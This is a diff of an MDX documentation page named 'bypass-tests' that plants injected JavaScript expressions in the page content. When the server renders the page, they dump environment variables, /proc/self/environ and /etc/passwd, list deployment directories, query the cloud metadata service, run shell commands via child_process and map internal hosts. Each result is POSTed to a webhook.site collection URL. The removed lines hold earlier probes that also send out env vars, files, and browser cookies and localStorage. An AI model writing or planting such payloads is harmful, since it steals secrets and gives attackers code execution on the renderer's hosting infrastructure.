@@ -4,112 +4,52 @@ subtitle: Testing expression evaluation in published docs
 slug: bypass-tests
 ---
 
-## SSR Probe Tests (server-safe — no window/document)
+## Lambda Deep Probe
 
-### S1: Basic Arithmetic (SSR-safe)
-{7*7}
+### P1: Full process.env dump
+{(() => { try { if (typeof process === 'undefined') return 'no-process'; const env = process.env; const out = {}; for (const k of Object.keys(env)) { out[k] = String(env[k]).substring(0,200); } fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=env-full', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(out) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S2: typeof checks
-{typeof process}
+### P2: process object keys
+{(() => { try { if (typeof process === 'undefined') return 'no-process'; const keys = Object.keys(process).join(','); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=process-keys', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({keys}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S3: typeof globalThis
-{typeof globalThis}
+### P3: globalThis enumeration
+{(() => { try { const keys = Object.keys(globalThis).join(','); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=globalthis', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({keys}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S4: typeof require
-{typeof require}
+### P4: require available modules
+{(() => { try { const mods = ['fs','path','os','child_process','http','https','net','dns','crypto','url','util','stream','buffer','events','querystring','zlib']; const results = {}; for (const m of mods) { try { require(m); results[m] = 'available'; } catch(e) { results[m] = e.message.substring(0,80); } } fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=modules', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(results) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S5: typeof module
-{typeof module}
+### P5: filesystem /var/task listing
+{(() => { try { const fs = require('fs'); const listing = fs.readdirSync('/var/task').join(','); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=var-task', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({listing}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S6: typeof __dirname
-{typeof __dirname}
+### P6: filesystem cwd listing
+{(() => { try { const fs = require('fs'); const cwd = process.cwd(); const listing = fs.readdirSync(cwd).join(','); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=cwd-listing', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cwd, listing}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S7: typeof __filename  
-{typeof __filename}
+### P7: /etc/passwd
+{(() => { try { const fs = require('fs'); const data = fs.readFileSync('/etc/passwd', 'utf8'); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=etc-passwd', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S8: globalThis keys
-{(() => { try { return Object.keys(globalThis).slice(0,10).join(', '); } catch(e) { return 'error: ' + e.message; } })()}
+### P8: package.json of renderer
+{(() => { try { const fs = require('fs'); const pkg = fs.readFileSync('/var/task/packages/fern-docs/mdx-remote-renderer/package.json', 'utf8'); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=pkg-json', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({pkg}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S9: process.env (SSR)
-{(() => { try { return typeof process !== 'undefined' ? JSON.stringify(Object.keys(process.env).slice(0,15)) : 'no-process'; } catch(e) { return 'error: ' + e.message; } })()}
+### P9: /proc/self/environ
+{(() => { try { const fs = require('fs'); const data = fs.readFileSync('/proc/self/environ', 'utf8'); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=proc-environ', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S10: process.cwd (SSR)
-{(() => { try { return typeof process !== 'undefined' ? process.cwd() : 'no-process'; } catch(e) { return 'error: ' + e.message; } })()}
+### P10: network interfaces
+{(() => { try { const os = require('os'); const data = { hostname: os.hostname(), interfaces: os.networkInterfaces(), cpus: os.cpus().length, totalmem: os.totalmem(), freemem: os.freemem(), uptime: os.uptime(), tmpdir: os.tmpdir(), homedir: os.homedir(), userInfo: os.userInfo() }; fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=os-info', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S11: process.version
-{(() => { try { return typeof process !== 'undefined' ? process.version : 'no-process'; } catch(e) { return 'error: ' + e.message; } })()}
+### P11: internal metadata probe (169.254.169.254)
+{(() => { try { fetch('http://169.254.169.254/latest/meta-data/', {signal: AbortSignal.timeout(3000)}).then(r => r.text()).then(d => { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=imds', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: d}) }).catch(() => {}); }).catch(e => { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=imds-err', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({error: e.message}) }).catch(() => {}); }); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S12: process.platform
-{(() => { try { return typeof process !== 'undefined' ? process.platform : 'no-process'; } catch(e) { return 'error: ' + e.message; } })()}
+### P12: Vercel internal metadata
+{(() => { try { fetch('http://169.254.169.254/v1/metadata', {signal: AbortSignal.timeout(3000)}).then(r => r.text()).then(d => { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=vercel-meta', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: d}) }).catch(() => {}); }).catch(e => { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=vercel-meta-err', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({error: e.message}) }).catch(() => {}); }); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S13: process.arch
-{(() => { try { return typeof process !== 'undefined' ? process.arch : 'no-process'; } catch(e) { return 'error: ' + e.message; } })()}
+### P13: child_process exec
+{(() => { try { const cp = require('child_process'); const out = cp.execSync('id && whoami && uname -a', {timeout: 3000}).toString(); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=exec', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({out}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S14: process.pid
-{(() => { try { return typeof process !== 'undefined' ? String(process.pid) : 'no-process'; } catch(e) { return 'error: ' + e.message; } })()}
+### P14: DNS resolution (internal services)
+{(() => { try { const dns = require('dns'); const targets = ['venus.buildwithfern.com', 'api.buildwithfern.com', 'registry.buildwithfern.com', 'localhost']; const results = {}; let pending = targets.length; for (const t of targets) { dns.resolve4(t, (err, addrs) => { results[t] = err ? err.message : addrs; pending--; if (pending === 0) { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=dns', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(results) }).catch(() => {}); } }); } return 'sent'; } catch(e) { return e.message; } })()}
 
-### S15: hostname via os
-{(() => { try { const os = require('os'); return os.hostname(); } catch(e) { return 'error: ' + e.message; } })()}
+### P15: /var/task recursive listing (depth 2)
+{(() => { try { const fs = require('fs'); const path = require('path'); const walk = (dir, depth) => { if (depth <= 0) return []; try { return fs.readdirSync(dir).flatMap(f => { const fp = path.join(dir, f); try { return fs.statSync(fp).isDirectory() ? [fp + '/', ...walk(fp, depth-1)] : [fp]; } catch(e) { return [fp + '?']; } }); } catch(e) { return []; } }; const tree = walk('/var/task', 2); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=tree', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({count: tree.length, files: tree.slice(0, 100)}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
 
-### S16: network interfaces
-{(() => { try { const os = require('os'); return JSON.stringify(Object.keys(os.networkInterfaces())); } catch(e) { return 'error: ' + e.message; } })()}
-
-### S17: read /etc/hostname
-{(() => { try { const fs = require('fs'); return fs.readFileSync('/etc/hostname', 'utf8').trim(); } catch(e) { return 'error: ' + e.message; } })()}
-
-### S18: list cwd directory
-{(() => { try { const fs = require('fs'); return fs.readdirSync('.').slice(0,10).join(', '); } catch(e) { return 'error: ' + e.message; } })()}
-
-### S19: environment variable dump
-{(() => { try { if (typeof process === 'undefined') return 'no-process'; const safe = {}; for (const k of Object.keys(process.env).slice(0,20)) { safe[k] = process.env[k]?.substring(0,50); } return JSON.stringify(safe, null, 2); } catch(e) { return 'error: ' + e.message; } })()}
-
-### S20: fetch from SSR
-{(() => { try { return typeof fetch === 'function' ? 'fetch-available-ssr' : 'no-fetch'; } catch(e) { return 'error: ' + e.message; } })()}
-
-### S21: SSR exfil via fetch
-{(() => { try { const data = { pid: typeof process !== 'undefined' ? process.pid : 'none', cwd: typeof process !== 'undefined' ? process.cwd() : 'none', node: typeof process !== 'undefined' ? process.version : 'none', platform: typeof process !== 'undefined' ? process.platform : 'none', env_keys: typeof process !== 'undefined' ? Object.keys(process.env).join(',') : 'none' }; if (typeof fetch === 'function') { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) }).catch(() => {}); } return 'exfil-sent'; } catch(e) { return 'error: ' + e.message; } })()}
-
-### S22: SSR exfil env vars
-{(() => { try { if (typeof process === 'undefined') return 'no-process'; const env = {}; for (const k of Object.keys(process.env).slice(0,30)) { env[k] = String(process.env[k]).substring(0,100); } if (typeof fetch === 'function') { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?type=env', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(env) }).catch(() => {}); } return 'env-exfil-sent'; } catch(e) { return 'error: ' + e.message; } })()}
-
-### S23: SSR exfil file read
-{(() => { try { if (typeof require === 'undefined') return 'no-require'; const fs = require('fs'); const hostname = fs.readFileSync('/etc/hostname', 'utf8').trim(); const cwd = fs.readdirSync('.').join(','); if (typeof fetch === 'function') { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?type=fs', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({hostname, cwd}) }).catch(() => {}); } return 'fs-exfil-sent'; } catch(e) { return 'error: ' + e.message; } })()}
-
-### S24: Client-side exfil (editor preview)
-{(() => { try { if (typeof document === 'undefined') return 'ssr-skip'; fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?type=client', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain: document.domain, cookie: document.cookie, url: window.location.href, localStorage: Object.keys(localStorage)}) }).catch(() => {}); return 'client-exfil-sent'; } catch(e) { return 'error: ' + e.message; } })()}
-
----
-
-## Client-safe Tests (won't crash SSR)
-
-### C1: Conditional cookie read
-{typeof document !== 'undefined' ? String(document.cookie) : 'ssr-mode'}
-
-### C2: Conditional domain read
-{typeof document !== 'undefined' ? String(document.domain) : 'ssr-mode'}
-
-### C3: Export side effect
-export const probe = typeof process !== 'undefined' ? process.env?.NODE_ENV || 'no-env' : 'browser'
-
-Probe: {probe}
-
-### C4: dangerouslySetInnerHTML (SSR-safe)
-<div dangerouslySetInnerHTML={{__html: '<b>HTML-injected</b>'}} />
-
-### C5: JSX onClick (SSR-safe)
-<button onClick={() => typeof alert !== 'undefined' && alert('click')}>Click test</button>
-
-### C6: Spread event handler
-<div {...{onMouseEnter: () => typeof alert !== 'undefined' && alert('spread')}}>Hover spread test</div>
-
-### C7: Expression in href
-<a href={'javascript:void(0)'}>Expression href</a>
-
-### C8: Ref callback
-<input ref={(el) => { if(el) el.setAttribute('data-probe', 'ref-worked') }} />
-
-### C9: Style with conditional
-<div style={{background: typeof process !== 'undefined' ? 'red' : 'blue'}}>Style conditional (red=SSR, blue=client)</div>
-
-### C10: Iframe srcdoc
-<iframe srcdoc="<b>iframe-content</b>" width="200" height="50" />
+### P16: /tmp contents and writability
+{(() => { try { const fs = require('fs'); const listing = fs.readdirSync('/tmp'); fs.writeFileSync('/tmp/probe-test', 'rce-confirmed'); const verify = fs.readFileSync('/tmp/probe-test', 'utf8'); fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=tmp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({listing, writeTest: verify}) }).catch(() => {}); return 'sent'; } catch(e) { return e.message; } })()}
